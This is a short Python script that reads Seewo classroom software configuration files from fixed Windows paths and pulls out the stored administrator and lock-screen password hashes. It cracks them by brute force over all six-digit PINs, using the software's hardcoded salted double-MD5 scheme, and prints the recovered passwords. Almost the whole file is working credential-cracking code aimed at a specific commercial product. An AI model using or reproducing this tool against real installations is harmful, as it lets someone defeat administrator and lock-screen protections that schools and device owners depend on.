import os
import hashlib


file1 = open(r"C:\ProgramData\Seewo\SeewoCore\SeewoCore.ini",
             "r", encoding="utf-8")
file2 = open(r"C:\Users\seewo\AppData\Roaming\Seewo\SeewoAbility\SeewoLockConfig.ini",
             "r", encoding="utf-8")


def md5(text):
    return hashlib.md5(text.encode()).hexdigest()


def enc(pwd):
    return md5(md5(pwd) + md5("hugo"))[8:24]


def trypwd(tar):
    for i in range(0, 1000000):
        pwd = f'{i:06}'
        if enc(pwd) == tar:
            return pwd
    return None


def find_cipher(file):
    file.seek(0)
    content = file.readlines()
    for line in content:
        if line.split("=")[0].lower() == "passwordv2" or line.split("=")[0].lower() == "lockpasswardv2":
            return line.split("=")[-1].replace("\n", "")


def main():
    cipher1 = find_cipher(file1)
    cipher2 = find_cipher(file2)
    if cipher1 != None:
        print("管理员密码是 "+trypwd(cipher1))
    if cipher2 != None:
        print("锁屏密码是 "+trypwd(cipher2))
    os.system('pause ')



if __name__ == '__main__':
    main()
